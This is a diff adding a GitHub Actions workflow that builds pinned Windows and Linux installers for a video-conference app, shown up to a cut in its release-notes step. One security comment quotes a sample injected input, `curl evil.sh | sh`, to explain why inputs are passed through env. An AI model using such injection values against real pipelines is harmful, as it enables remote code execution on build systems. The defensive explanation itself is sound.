@@ -1,0 +1,696 @@
+name: Build installers (Windows + Linux, from private app repo)
+
+# Orchestrated build: this repository holds only the workflow. The sources are cloned from
+# APP_REPOSITORY at the ref given on dispatch, into APP_DIR inside the workspace, and every
+# build step runs with `working-directory: ${{ env.APP_DIR }}`.
+#
+# VERSION POLICY — same as the app repo's own workflow, and for the same reason: MSYS2 is a
+# rolling distribution, so anything installed by name is "whatever is current that day".
+# Pinned: runner images (never *-latest), actions (commit SHA, tag in a trailing comment),
+# MSYS2 libraries (exact version URLs on repo.msys2.org), Inno Setup (choco --version).
+# Deliberately NOT pinned: apt versions on Linux, MSYS2 transitive deps (no lockfile exists),
+# and the MSYS2 build DRIVERS cmake + ninja. What decides what the binary IS stays pinned;
+# what merely drives the build tracks the repository.
+#
+# Bump the MSYS2 block as one set, never a single line: gcc and gcc-libs must match, opencv
+# must stay 4.x until the tree is ported, and ffmpeg follows opencv (soname reasons, below).
+
+on:
+  workflow_dispatch:
+    inputs:
+      release_tag:
+        description: "Version, e.g. 2.1.0 (a leading v is accepted and stripped)"
+        required: true
+      source_ref:
+        description: "Branch, tag or full SHA of the app repository to build"
+        required: true
+        default: main
+      targets:
+        description: "Which installers to build"
+        type: choice
+        required: false
+        default: both
+        options: [both, windows, linux]
+      publish_release:
+        description: "Also create the git tag and a GitHub Release with these installers"
+        type: boolean
+        required: false
+        default: false
+
+permissions:
+  contents: write        # needed to create the tag + release when publish_release is on
+
+env:
+  APP_REPOSITORY: perseverance-tech-tw/video-conference-using-fisheye
+  APP_DIR: video-conference-using-fisheye
+
+jobs:
+  # ---------------------------------------------------------------------------
+  # Validate the inputs ONCE, and resolve source_ref to a concrete commit, so
+  # both installers are built from exactly the same tree. Resolving here rather
+  # than per-job matters: a branch can move between the Windows job starting and
+  # the Linux job starting, and you would ship two different builds under one
+  # version number without anything in the log saying so.
+  # ---------------------------------------------------------------------------
+  prepare:
+    runs-on: ubuntu-24.04
+    outputs:
+      version: ${{ steps.v.outputs.version }}
+      tag: ${{ steps.v.outputs.tag }}
+      source_ref: ${{ steps.v.outputs.source_ref }}
+      app_commit: ${{ steps.v.outputs.app_commit }}
+    steps:
+      - id: v
+        shell: bash
+        # Inputs and secrets go through `env:`, NOT inline ${{ }} inside the script. Inline
+        # interpolation pastes the value into the shell source before bash ever sees it, so a
+        # release_tag of `1.0"; curl evil.sh | sh; #` executes. Through env it is just data.
+        env:
+          RAW_TAG: ${{ inputs.release_tag }}
+          SOURCE_REF: ${{ inputs.source_ref }}
+          APP_TOKEN: ${{ secrets.PERSONAL_ACCESS_TOKEN }}
+        run: |
+          set -euo pipefail
+          ver="${RAW_TAG#v}"
+          if ! [[ "$ver" =~ ^[0-9]+(\.[0-9]+)*$ ]]; then
+            echo "Invalid release_tag: $RAW_TAG"
+            echo "Use a version like 2.1.0"
+            exit 1
+          fi
+          if [ -z "$SOURCE_REF" ]; then
+            echo "source_ref is required"
+            exit 1
+          fi
+
+          # Resolve to a commit now. A 40-hex ref is already one; anything else is asked of the
+          # remote. This also fails fast, here, if the branch/tag does not exist or the PAT
+          # cannot see the private repository — instead of failing inside a build job that has
+          # already spent four minutes installing a toolchain.
+          if [[ "$SOURCE_REF" =~ ^[0-9a-f]{40}$ ]]; then
+            commit="$SOURCE_REF"
+          else
+            commit=$(git ls-remote \
+              "https://x-access-token:${APP_TOKEN}@github.com/${APP_REPOSITORY}.git" \
+              "$SOURCE_REF" | awk 'NR==1 {print $1}')
+            if [ -z "$commit" ]; then
+              echo "source_ref '$SOURCE_REF' not found in $APP_REPOSITORY"
+              echo "(or PERSONAL_ACCESS_TOKEN cannot read that repository)"
+              exit 1
+            fi
+          fi
+
+          {
+            echo "version=$ver"
+            echo "tag=v$ver"
+            echo "source_ref=$SOURCE_REF"
+            echo "app_commit=$commit"
+          } >> "$GITHUB_OUTPUT"
+          echo "Version: $ver"
+          echo "Source:  $APP_REPOSITORY @ $SOURCE_REF ($commit)"
+
+  # ---------------------------------------------------------------------------
+  # Linux: .deb (primary) + portable .tar.gz
+  # ---------------------------------------------------------------------------
+  build-linux:
+    if: ${{ inputs.targets == 'both' || inputs.targets == 'linux' }}
+    needs: prepare
+    runs-on: ubuntu-24.04                 # not ubuntu-latest: 26.04 is already in preview
+    steps:
+      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262            # v4
+        with: { fetch-depth: 1 }
+
+      - name: Clone the app repository at the resolved commit
+        shell: bash
+        env:
+          APP_TOKEN: ${{ secrets.PERSONAL_ACCESS_TOKEN }}
+          APP_COMMIT: ${{ needs.prepare.outputs.app_commit }}
+        run: |
+          set -euo pipefail
+          # init + fetch, not `clone --branch`: --branch only accepts a branch or tag name, so a
+          # commit SHA in source_ref would be rejected. Fetching the SHA directly works for all
+          # three, and it is the only way to honour the commit prepare resolved.
+          git init -q "$APP_DIR"
+          cd "$APP_DIR"
+          git remote add origin \
+            "https://x-access-token:${APP_TOKEN}@github.com/${APP_REPOSITORY}.git"
+          git fetch -q --depth 1 origin "$APP_COMMIT"
+          git checkout -q FETCH_HEAD
+          # The token is written into .git/config by `remote add` and stays there for the rest of
+          # the job — including anywhere the workspace gets archived. Take it back out now.
+          git remote set-url origin "https://github.com/${APP_REPOSITORY}.git"
+          echo "Building ${APP_REPOSITORY}@$(git rev-parse --short HEAD)"
+
+      - name: Install build + runtime dependencies
+        # apt versions are deliberately unpinned: Ubuntu drops superseded versions from the
+        # archive within weeks, so a pinned version 404s. The distro release is the granularity.
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y --no-install-recommends \
+            build-essential cmake ninja-build pkg-config git file \
+            libopencv-dev libsdl2-dev \
+            libgstreamer1.0-dev libgstreamer-plugins-base1.0-dev \
+            libturbojpeg0-dev ocl-icd-opencl-dev \
+            libegl1-mesa-dev libgles2-mesa-dev libgbm-dev libdrm-dev
+
+      - name: Stamp version
+        working-directory: ${{ env.APP_DIR }}
+        run: echo "v${{ needs.prepare.outputs.version }}" > version.txt
+
+      - name: Configure
+        # LVGL is fetched by CMake itself when third_party/lvgl is absent (MOILMEET_FETCH_LVGL).
+        working-directory: ${{ env.APP_DIR }}
+        run: cmake -S . -B build -G Ninja -DCMAKE_BUILD_TYPE=Release -DMOILMEET_BUILD_TESTS=ON
+
+      - name: Build
+        working-directory: ${{ env.APP_DIR }}
+        run: cmake --build build
+
+      - name: Test
+        working-directory: ${{ env.APP_DIR }}
+        run: ctest --test-dir build --output-on-failure
+
+      - name: Package (.deb + .tar.gz)
+        working-directory: ${{ env.APP_DIR }}/build
+        run: cpack
+
+      - name: Add install/uninstall scripts to the portable archive
+        # CPack's TGZ is a plain rootfs overlay (opt/… + usr/…). The scripts are what make it
+        # installable on non-Debian distros, so fold them in rather than shipping them loose.
+        shell: bash
+        working-directory: ${{ env.APP_DIR }}/build
+        run: |
+          set -euo pipefail
+          tgz=$(ls moilmeet-*-linux-*.tar.gz)
+          mkdir -p repack && tar xzf "$tgz" -C repack
+          cp ../packaging/linux/install.sh ../packaging/linux/uninstall.sh repack/
+          chmod +x repack/install.sh repack/uninstall.sh
+          rm -f "$tgz"
+          tar czf "$tgz" -C repack .
+          # `tar … | head` is fatal under `set -o pipefail`: head closes the pipe after ten lines,
+          # tar dies of EPIPE with exit 2, and the step fails even though the repack succeeded.
+          # sed consumes the whole stream, so tar always reaches a clean exit.
+          echo "Repacked $tgz:"; tar tzf "$tgz" | sed -n '1,20p'
+
+      - name: Verify the .deb installs and the app starts
+        # A package that builds but does not install is worthless; catch that here rather than on
+        # a user's machine. Xvfb because the app opens an SDL window.
+        shell: bash
+        working-directory: ${{ env.APP_DIR }}
+        run: |
+          set -euo pipefail
+          sudo apt-get install -y ./build/moilmeet_*_amd64.deb
+          test -x /opt/moilmeet/moilmeet_app
+          test -x /usr/bin/moilmeet
+          sudo apt-get install -y xvfb
+          xvfb-run -a moilmeet --no-virtual-cam --no-menu --start-now \
+                   --source /opt/moilmeet/assets/syue_7730v1_7.png \
+                   --snapshot /tmp/smoke.png 20
+          test -s /tmp/smoke.png && echo "smoke test OK: snapshot rendered"
+          sudo apt-get remove -y moilmeet
+
+      - uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02     # v4
+        with:
+          name: linux-packages
+          path: |
+            ${{ env.APP_DIR }}/build/moilmeet_*_amd64.deb
+            ${{ env.APP_DIR }}/build/moilmeet-*-linux-*.tar.gz
+          if-no-files-found: error
+
+  # ---------------------------------------------------------------------------
+  # Windows: Inno Setup installer (.exe)
+  # ---------------------------------------------------------------------------
+  build-windows:
+    if: ${{ inputs.targets == 'both' || inputs.targets == 'windows' }}
+    needs: prepare
+    # NOT windows-latest. That label moves to the next image on GitHub's schedule and takes the
+    # whole MSYS2 story with it; the point of every pin below is that the build does not change
+    # unless someone changes it.
+    runs-on: windows-2025
+    defaults:
+      # Everything in this job assumes the MSYS2 UCRT64 shell: /ucrt64 is an MSYS2 mount point
+      # and does not exist in Git for Windows' bash. The two steps that must run BEFORE
+      # setup-msys2 override this with `shell: bash` explicitly.
+      run: { shell: 'msys2 {0}' }
+    steps:
+      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262            # v4
+        with: { fetch-depth: 1 }
+
+      - name: Clone the app repository at the resolved commit
+        shell: bash                       # Git bash: setup-msys2 has not run yet
+        env:
+          APP_TOKEN: ${{ secrets.PERSONAL_ACCESS_TOKEN }}
+          APP_COMMIT: ${{ needs.prepare.outputs.app_commit }}
+        run: |
+          set -euo pipefail
+          git init -q "$APP_DIR"
+          cd "$APP_DIR"
+          git remote add origin \
+            "https://x-access-token:${APP_TOKEN}@github.com/${APP_REPOSITORY}.git"
+          git fetch -q --depth 1 origin "$APP_COMMIT"
+          git checkout -q FETCH_HEAD
+          git remote set-url origin "https://github.com/${APP_REPOSITORY}.git"
+          echo "Building ${APP_REPOSITORY}@$(git rev-parse --short HEAD)"
+
+      - name: Set up MSYS2 UCRT64
+        # UCRT64 is the toolchain this project has actually been built with (README) and the one
+        # run.bat looks for; the app's DLLs are taken from the same prefix below.
+        uses: msys2/setup-msys2@66cd2cce69caa17b53920067426061ca1de3a884         # v2
+        with:
+          msystem: UCRT64
+          # No `install:` list on purpose — a name means "whatever is current", and that is what
+          # broke this job. Every package is pinned by exact version in the next step.
+          # `update: true` stays on: MSYS2 does not support partial upgrades, so the base has to
+          # be a coherent snapshot before anything is added on top.
+          update: true
+
+      - name: Install the pinned MSYS2 toolchain
+        # On 2026-08-10 `pacman -S opencv` turned OpenCV from 4.x into 5.0.0 and this job died in
+        # the first source using the imgproc geometry API — a green pipeline broken by nothing in
+        # either repository. Old package files stay on the mirror, so these URLs keep resolving,
+        # and every one was verified to return 200 together with its .sig so pacman still checks
+        # signatures.
+        #
+        # THE SET IS THE NEWEST COHERENT SNAPSHOT, and it has to be: pinning to last year's local
+        # toolchain (gcc 14.2.0, OpenCV 4.11.0) is not installable here, because gcc's supporting
+        # packages resolve from the CURRENT repository and require a newer gcc-libs than gcc
+        # 14.2.0-3's exact-version dependency allows. Only OpenCV is deliberately held back, to
+        # the last 4.x MSYS2 published — it has no such dependency, and it is the one package
+        # that decides whether this tree compiles at all.
+        #
+        # WHY ffmpeg IS PINNED TOO: libopencv_videoio-413.dll statically imports avcodec-62,
+        # avdevice-62, avformat-62, avutil-60 and swscale-9, and the repository has moved to
+        # ffmpeg 9.0 (-63/-61/-10). Those files no longer exist, so videoio cannot load and every
+        # process importing it dies at startup with 0xc0000135. Holding one library back pulls
+        # its imports back with it.
+        working-directory: ${{ env.APP_DIR }}
+        run: |
+          set -euo pipefail
+          UCRT=https://repo.msys2.org/mingw/ucrt64
+          MSYS=https://repo.msys2.org/msys/x86_64
+
+          # name | pinned version | package URL. Order matters: gcc-libs before gcc.
+          PINS=(
+            "git|2.55.0-1|$MSYS/git-2.55.0-1-x86_64.pkg.tar.zst"
+            "mingw-w64-ucrt-x86_64-gcc-libs|16.2.0-3|$UCRT/mingw-w64-ucrt-x86_64-gcc-libs-16.2.0-3-any.pkg.tar.zst"
+            "mingw-w64-ucrt-x86_64-gcc|16.2.0-3|$UCRT/mingw-w64-ucrt-x86_64-gcc-16.2.0-3-any.pkg.tar.zst"
+            "mingw-w64-ucrt-x86_64-pkgconf|1~3.0.5-1|$UCRT/mingw-w64-ucrt-x86_64-pkgconf-1~3.0.5-1-any.pkg.tar.zst"
+            "mingw-w64-ucrt-x86_64-SDL2|2.32.10-1|$UCRT/mingw-w64-ucrt-x86_64-SDL2-2.32.10-1-any.pkg.tar.zst"
+            "mingw-w64-ucrt-x86_64-imagemagick|7.1.2.27-1|$UCRT/mingw-w64-ucrt-x86_64-imagemagick-7.1.2.27-1-any.pkg.tar.zst"
+            # Before opencv, deliberately: opencv depends on ffmpeg without a version, so if it
+            # went first pacman would pull the current ffmpeg (9.0) in as a dependency and this
+            # pin would be a downgrade afterwards.
+            "mingw-w64-ucrt-x86_64-ffmpeg|8.1.2-2|$UCRT/mingw-w64-ucrt-x86_64-ffmpeg-8.1.2-2-any.pkg.tar.zst"
+            "mingw-w64-ucrt-x86_64-opencv|4.13.0-7|$UCRT/mingw-w64-ucrt-x86_64-opencv-4.13.0-7-any.pkg.tar.zst"
+          )
+
+          # Fetch first, with -f so an HTTP error is fatal and names the file, rather than letting
+          # pacman decide what to do about a half-answered request.
+          mkdir -p pinned-pkgs && cd pinned-pkgs
+          for p in "${PINS[@]}"; do
+            IFS='|' read -r name ver url <<< "$p"
+            curl -fsSL --retry 3 -O "$url"
+            curl -fsSL --retry 3 -O "$url.sig"   # keeps pacman's signature check meaningful
+          done
+          ls -l
+
+          # One package per transaction, each checked immediately. A single `pacman -U --needed`
+          # for all of them installed five, skipped the rest, and still exited 0 — the build then
+          # failed much later with no trace of why. `--needed` is gone, and every pin is verified
+          # the moment it is installed.
+          for p in "${PINS[@]}"; do
+            IFS='|' read -r name ver url <<< "$p"
+            echo "==================== $name $ver"
+            pacman -U --noconfirm "$(basename "$url")"
+            got=$(pacman -Q "$name" 2>/dev/null | awk '{print $2}') || true
+            if [ "$got" != "$ver" ]; then
+              echo "!! $name was NOT installed as pinned: wanted $ver, have ${got:-<nothing>}"
+              echo "!! pacman exited 0 above, so read its output for the reason (conflict, missing"
+              echo "!! dependency, or a skip). Do not bump one pin alone — the set moves together."
+              exit 1
+            fi
+          done
+
+          # -----------------------------------------------------------------------------------
+          # RESTORE THE LIBRARIES ffmpeg 8.1.2-2 WAS BUILT AGAINST. The import walk after Build
+          # found libbluray-3.dll (imported by avformat-62) and ggml.dll (imported by avfilter-11)
+          # missing, and no current package provides either soname. They are recoverable exactly:
+          # a pacman package's .BUILDINFO lists every package present when it was compiled, so
+          # read the versions out of the pinned ffmpeg tarball rather than hard-coding numbers
+          # that would rot the same way. Only the sonames that actually went missing are
+          # restored — downgrading zlib/openssl/zstd would strand the unpinned cmake below.
+          echo "==================== restoring ffmpeg's build-time dependencies"
+          BUILDINFO=$(tar -xOf mingw-w64-ucrt-x86_64-ffmpeg-8.1.2-2-any.pkg.tar.zst .BUILDINFO)
+
+          echo "--- ffmpeg 8.1.2-2 was built against (mingw packages only) ---"
+          printf '%s\n' "$BUILDINFO" | sed -n 's/^installed = \(mingw-w64-ucrt-x86_64-.*\)$/  \1/p'
+
+          for base in libbluray ggml whisper.cpp; do
+            name="mingw-w64-ucrt-x86_64-$base"
+            ver=$(printf '%s\n' "$BUILDINFO" \
+                  | awk -v p="installed = $name-" 'index($0,p)==1 {
+                        s=substr($0, length(p)+1); sub(/-any$/, "", s)
+                        # The name prefix alone is ambiguous — "…-ggml-" also prefixes
+                        # "…-ggml-base-0.9-1-any". A version starts with a digit; a sibling
+                        # package name does not.
+                        if (s ~ /^[0-9]/) { print s; exit } }')
+            if [ -z "$ver" ]; then
+              echo "  $name: not in ffmpeg's build environment — nothing to restore"
+              continue
+            fi
+            have=$(pacman -Q "$name" 2>/dev/null | awk '{print $2}') || true
+            if [ "$have" = "$ver" ]; then
+              echo "  $name: already at $ver"
+              continue
+            fi
+            echo "  $name: ${have:-<not installed>} -> $ver (as ffmpeg was built)"
+            f="$name-$ver-any.pkg.tar.zst"
+            curl -fsSL --retry 3 -O "$UCRT/$f"
+            curl -fsSL --retry 3 -O "$UCRT/$f.sig"
+            pacman -U --noconfirm "$f"
+          done
+
+          # -----------------------------------------------------------------------------------
+          # BUILD DRIVERS — installed BY NAME, and deliberately NOT pinned. A pinned cmake died
+          # in Configure with a bare `exit 127` because MSYS2 rebuilt cmake against a jsoncpp
+          # past soname 26, leaving the pinned binary importing libjsoncpp-26.dll, which no
+          # longer exists. pacman is satisfied and exits 0; the package is registered at exactly
+          # the version asked for; it simply cannot start. Nothing in cmake or ninja is linked
+          # into moilmeet_app.exe, so their version cannot change the artifact — all a pin buys
+          # here is a standing appointment with the next soname bump in a dependency we cannot
+          # pin without a lockfile.
+          #
+          # AFTER the pins, deliberately: the pinned set contains two downgrades (ffmpeg, then
+          # OpenCV) and anything installed afterwards must not float them forward again.
+          echo "==================== build drivers (unpinned, by name)"
+          pacman -S --noconfirm mingw-w64-ucrt-x86_64-cmake mingw-w64-ucrt-x86_64-ninja
+
+          # Re-check every pin now that the drivers are in.
+          for p in "${PINS[@]}"; do
+            IFS='|' read -r name ver url <<< "$p"
+            got=$(pacman -Q "$name" 2>/dev/null | awk '{print $2}') || true
+            [ "$got" = "$ver" ] || {
+              echo "!! $name moved from $ver to ${got:-<nothing>} while installing the build drivers."
+              echo "!! The pinned set no longer coexists with a current cmake/ninja — bump it as a set."
+              exit 1
+            }
+          done
+
+          echo "--- pinned versions actually installed, against what the repository now carries ---"
+          # A pin that has fallen behind the repository is not an error by itself — holding OpenCV
+          # at 4.x is the entire point — but it is the first thing to look at when something here
+          # will not run, so print it on every run rather than only when asked.
+          for p in "${PINS[@]}"; do
+            IFS='|' read -r name ver url <<< "$p"
+            repo=$(pacman -Si "$name" 2>/dev/null | awk '/^Version/ {print $3; exit}') || true
+            note=""
+            if [ -n "${repo:-}" ] && [ "$(vercmp "$ver" "$repo")" -lt 0 ]; then
+              note="   <-- pinned behind the repository"
+            fi
+            printf '%-40s installed %-14s repository %s%s\n' "$name" "$ver" "${repo:-<unknown>}" "$note"
+          done
+          echo "--- build drivers resolved to ---"
+          pacman -Q mingw-w64-ucrt-x86_64-cmake mingw-w64-ucrt-x86_64-ninja
+          echo "--- full resolved package set (for reproducing this run) ---"
+          pacman -Q | sort
+
+      - name: Verify the toolchain actually runs
+        # The step above proves every pin is REGISTERED. It does not prove one of them can be
+        # EXECUTED, and those are different things — which is how this job failed with nothing
+        # but `Error: Process completed with exit code 127` in Configure. 127 is "command not
+        # found", and MSYS2 reports a PE image that fails to LOAD the same way, so a missing DLL
+        # and an empty PATH are indistinguishable. This step turns that number into a filename.
+        run: |
+          set -euo pipefail
+          echo "MSYSTEM=${MSYSTEM:-<unset>}"
+          echo "PATH=$PATH"
+
+          fail=0
+          for t in cmake ninja gcc g++ pkgconf magick; do
+            p=$(command -v "$t" 2>/dev/null || true)
+            if [ -z "$p" ]; then
+              echo "!! $t is not on PATH at all — the UCRT64 prefix is not what this job assumes"
+              fail=1; continue
+            fi
+            # api-ms-win-crt-*.dll are API-set contracts, resolved by the loader from System32 and
+            # never present as files; ldd lists them as "not found" for any binary it could not
+            # load, so they bury the one line that matters. The real culprit is the other entry.
+            unresolved=$(ldd "$p" 2>/dev/null | grep 'not found' | grep -v 'api-ms-win-' || true)
+            if [ -n "$unresolved" ]; then
+              echo "!! $t ($p) has unresolved DLLs:"
+              echo "$unresolved"
+              fail=1; continue
+            fi
+            # ldd resolves through the ambient PATH, so it catches an outright missing DLL but not
+            # one whose exports have moved; running the tool catches the rest.
+            if ! out=$("$t" --version 2>&1); then
+              echo "!! $t ($p) is installed but will not run:"
+              echo "$out"
+              fail=1; continue
+            fi
+            printf '%-8s %s\n' "$t" "$(printf '%s\n' "$out" | head -n1)"
+          done
+          [ "$fail" -eq 0 ] || {
+            echo
+            echo "!! The MSYS2 toolchain does not execute. This is what a bare 'exit 127' in"
+            echo "!! Configure means. Read the 'pinned behind the repository' table in the step"
+            echo "!! above: a pinned package stranded against a dependency that moved on is the"
+            echo "!! usual cause, and the cure is to bump the set (gcc with gcc-libs, opencv —"
+            echo "!! which must stay 4.x — with ffmpeg), not to bump one line."
+            exit 1
+          }
+
+      - name: Stamp version
+        working-directory: ${{ env.APP_DIR }}
+        run: echo "v${{ needs.prepare.outputs.version }}" > version.txt
+
+      - name: Configure
+        working-directory: ${{ env.APP_DIR }}
+        run: cmake -S . -B build -G Ninja -DCMAKE_BUILD_TYPE=Release -DMOILMEET_BUILD_TESTS=ON
+
+      - name: Build
+        working-directory: ${{ env.APP_DIR }}
+        run: cmake --build build
+
+      - name: Verify every built binary can load
+        # ctest reported `Exit code 0xc0000135***Exception` — STATUS_DLL_NOT_FOUND, a number with
+        # no filename. This step supplies the filename.
+        #
+        # WHY objdump AND NOT ldd: the first attempt ran ldd over the OpenCV DLLs and reported
+        # "all imports resolve" while the same run died at 0xc0000135 — a false pass, worse than
+        # no check. ldd answers by asking the loader through the ambient PATH, and says nothing
+        # useful about a library it cannot load in the first place. objdump reads the import
+        # table out of the file itself, so this walks the real graph by hand against the only two
+        # directories the loader will use.
+        working-directory: ${{ env.APP_DIR }}
+        run: |
+          set -euo pipefail
+          cd build
+
+          declare -A seen
+          missing=""
+          # tests/ is an add_subdirectory, so its executables land in build/tests/, not build/.
+          roots=$( { ls moilmeet_app.exe; ls tests/test_*.exe; ls test_*.exe; } 2>/dev/null || true)
+          [ -n "$roots" ] || { echo "!! nothing was built — no .exe in build/"; exit 1; }
+
+          queue=()
+          for r in $roots; do queue+=("$r"); done
+          echo "Walking the import graph of: $(echo $roots | tr '\n' ' ')"
+
+          while [ "${#queue[@]}" -gt 0 ]; do
+            cur="${queue[0]}"; queue=("${queue[@]:1}")
+            for n in $(objdump -p "$cur" 2>/dev/null | awk '/DLL Name:/ {print $3}'); do
+              key=$(printf '%s' "$n" | tr 'A-Z' 'a-z')
+              [ -n "${seen[$key]:-}" ] && continue
+              seen[$key]=1
+              case "$key" in api-ms-win-*|ext-ms-win-*) continue ;; esac
+              path=""
+              for d in /ucrt64/bin /c/Windows/System32; do
+                [ -f "$d/$n" ] && { path="$d/$n"; break; }
+              done
+              if [ -z "$path" ]; then
+                missing="$missing $n"
+                echo "  MISSING  $n   (imported by $(basename "$cur"))"
+              else
+                queue+=("$path")
+              fi
+            done
+          done
+
+          if [ -n "$missing" ]; then
+            echo
+            echo "!! This is 0xc0000135, as filenames. Each is imported by something that was"
+            echo "!! built or installed here, and no longer exists in /ucrt64/bin or System32."
+            # Which package owns the name is the actionable half. The files database is not synced
+            # by default; keep the lookup advisory — a diagnostic must never itself fail a step.
+            pacman -Fy >/dev/null 2>&1 || true
+            echo "!! The repository currently provides these names via:"
+            for d in $missing; do
+              owner=$(pacman -F "$d" 2>/dev/null | head -n1 | awk '{print $1" "$2}') || true
+              printf '   %-34s %s\n' "$d" "${owner:-<not in any package>}"
+            done
+            echo "!! Pin those packages to the versions carrying these sonames, as a set — the way"
+            echo "!! ffmpeg is pinned for OpenCV. Holding one library back pulls its imports back."
+            exit 1
+          fi
+          echo "Import graph complete: every DLL resolves from /ucrt64/bin or System32."
+
+      - name: Test
+        working-directory: ${{ env.APP_DIR }}
+        run: ctest --test-dir build --output-on-failure
+
+      - name: Stage the application
+        # Everything the installer ships, laid out exactly as the app expects at runtime:
+        # assets/ and MoilVirtualCam.ax are resolved relative to the executable.
+        #
+        # NO `shell: bash` here — on a Windows runner that selects Git for Windows' bash, where
+        # /ucrt64 does not exist and magick (and ldd, next step) are not on PATH.
+        working-directory: ${{ env.APP_DIR }}
+        run: |
+          set -euo pipefail
+          rm -rf stage && mkdir -p stage/assets
+          cp build/moilmeet_app.exe stage/
+          cp -r assets/. stage/assets/
+          # assets/fonts in the source tree holds only the icon font; the CJK and Arabic fallbacks
+          # are taken from the LVGL clone by the app's POST_BUILD step, so they exist only in
+          # build/. i18n.cpp looks for them beside the executable at runtime — without this copy
+          # the installed app has no CJK/Arabic glyphs.
+          cp -r build/assets/. stage/assets/
+          rm -f stage/assets/*.avi stage/assets/.gitignore
+          cp -r third_party/MoilVirtualCam/MoilVirtualCam.ax \
+                third_party/MoilVirtualCam/opencv_world4120.dll stage/
+          cp LICENSE stage/
+          # Icon for the installer + shortcuts (optional: the .iss skips it when absent).
+          magick -background none assets/moil_logo.svg -define icon:auto-resize=256,64,48,32,16 \
+                 stage/assets/moilmeet.ico || echo "icon conversion skipped"
+
+      - name: Bundle the MinGW runtime DLLs
+        # Without these the app dies with 0xc0000135 on any machine without MSYS2. ldd lists the
+        # full transitive set; take only what comes from /ucrt64 (the rest is Windows' own).
+        # NO `shell: bash` — under Git bash the awk filter matches nothing and this bundles ZERO.
+        working-directory: ${{ env.APP_DIR }}
+        run: |
+          set -euo pipefail
+          cd stage
+          copied=0
+          # Repeat until closure: a copied DLL can itself pull in further /ucrt64 DLLs.
+          for pass in 1 2 3 4 5; do
+            before=$copied
+            while read -r dll; do
+              [ -f "$(basename "$dll")" ] && continue
+              cp "$dll" . && copied=$((copied+1))
+            done < <(ldd ./moilmeet_app.exe ./*.dll 2>/dev/null \
+                     | awk '/=> \/ucrt64/ {print $3}' | sort -u)
+            [ "$copied" = "$before" ] && break
+          done
+          echo "Bundled $copied DLL(s)."
+          [ "$copied" -gt 0 ] || { echo "!! bundled nothing — wrong shell, or /ucrt64 not mounted"; exit 1; }
+
+          # Closure check. `ldd | grep "not found"` is NOT enough on its own: ldd resolves through
+          # the ambient PATH, so with MSYS2 present it reports everything as found even when the
+          # stage directory is empty. Assert instead that every dependency which is not one of
+          # Windows' own has a copy INSIDE stage, which is all the target machine will have.
+          missing=0
+          while read -r name arrow path rest; do
+            case "$path" in /[cC]/[wW][iI][nN][dD][oO][wW][sS]/*) continue ;; esac
+            [ -f "$name" ] || { echo "!! not bundled: $name (resolved from $path)"; missing=$((missing+1)); }
+          done < <(ldd ./moilmeet_app.exe ./*.dll 2>/dev/null | grep '=>')
+          [ "$missing" -eq 0 ] || { echo "!! $missing dependency(ies) would be missing on a clean PC"; exit 1; }
+          echo "Dependency closure OK: everything resolves from stage/ or System32."
+
+      - name: Build the installer (Inno Setup)
+        shell: pwsh
+        working-directory: ${{ env.APP_DIR }}
+        run: |
+          # Pinned like everything else. 6.7.1 is the newest Chocolatey carries; the .iss uses
+          # nothing newer than Inno Setup 6.3 (ArchitecturesInstallIn64BitMode=x64compatible).
+          choco install innosetup --version=6.7.1 -y --no-progress
+          # ${env:ProgramFiles(x86)}, not $env:ProgramFiles(x86): PowerShell ends the variable
+          # name at the parenthesis, so the latter expands to "C:\Program Files(x86)" — no space —
+          # and ISCC.exe is never found.
+          $iscc = "${env:ProgramFiles(x86)}\Inno Setup 6\ISCC.exe"
+          if (-not (Test-Path $iscc)) {
+            $iscc = (Get-Command ISCC.exe -ErrorAction SilentlyContinue).Source
+          }
+          if (-not $iscc) { throw "ISCC.exe not found after 'choco install innosetup'" }
+          Write-Host "Using $iscc"
+          & $iscc `
+            /DMyAppVersion=${{ needs.prepare.outputs.version }} `
+            /DStageDir=$PWD\stage `
+            /O$PWD\dist `
+            packaging\windows\moilmeet.iss
+          if ($LASTEXITCODE -ne 0) { throw "ISCC failed with exit code $LASTEXITCODE" }
+
+      - uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02     # v4
+        with:
+          name: windows-installer
+          path: ${{ env.APP_DIR }}/dist/MoilMeet-*-windows-setup.exe
+          if-no-files-found: error
+
+  # ---------------------------------------------------------------------------
+  # Release — created in THIS repository (GITHUB_TOKEN cannot tag the private app
+  # repo), with the app commit recorded in the notes so a release always names the
+  # source it came from. Only when explicitly asked for, so trial runs make no tags.
+  # ---------------------------------------------------------------------------
+  release:
+    # `targets` can skip one of the builds, and a skipped `needs` job would normally skip this one
+    # too. A status-check function (`!cancelled()`) makes the condition evaluate regardless of how
+    # the needed jobs ended — which then means a FAILED build would no longer stop the release, so
+    # failure and cancellation are excluded explicitly.
+    if: >-
+      ${{ inputs.publish_release
+      && !cancelled()
+      && !contains(needs.*.result, 'failure')
+      && !contains(needs.*.result, 'cancelled') }}
+    needs: [prepare, build-linux, build-windows]
+    runs-on: ubuntu-24.04
+    steps:
+      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262            # v4
+        with: { fetch-depth: 0 }
+
+      - uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093   # v4
+        with: { path: artifacts }
+
+      - name: Collect release notes
+        id: notes
+        shell: bash
+        run: |
+          set -euo pipefail
+          {
+            echo 'body<<MOILMEET_EOF'
+            echo "Built from \`${APP_REPOSITORY}\` @ \`${{ needs.prepare.outputs.source_ref }}\`"
+            echo "(commit \`${{ needs.prepare.outputs.app_commit }}\`)."
+            echo
+            echo '## Install'
+            # Only describe what this run actually attached. With targets=windows or targets=linux
+            # the other platform's artifact does not exist, and instructions for a file that is
+            # not in the release are worse than no instructions.
+            if [ -d artifacts/linux-packages ]; then
+              echo '**Linux (Debian/Ubuntu)** — apt resolves the dependencies:'
+              echo '```'
+              echo "sudo apt install ./moilmeet_${{ needs.prepare.outputs.version }}_amd64.deb"
+              echo 'moilmeet'
+              echo '```'
+              echo '**Linux (other distros)** — extract the .tar.gz, then `sudo ./install.sh`.'
+              echo
+            fi
+            if [ -d artifacts/windows-installer ]; then
+              echo '**Windows** — run the setup .exe (per-user by default, no administrator needed).'
+              echo
+            fi
+            if [ ! -d artifacts/linux-packages ] || [ ! -d artifacts/windows-installer ]; then
+              echo "_Partial release: built with \`targets: ${{ inputs.targets }}\`._"
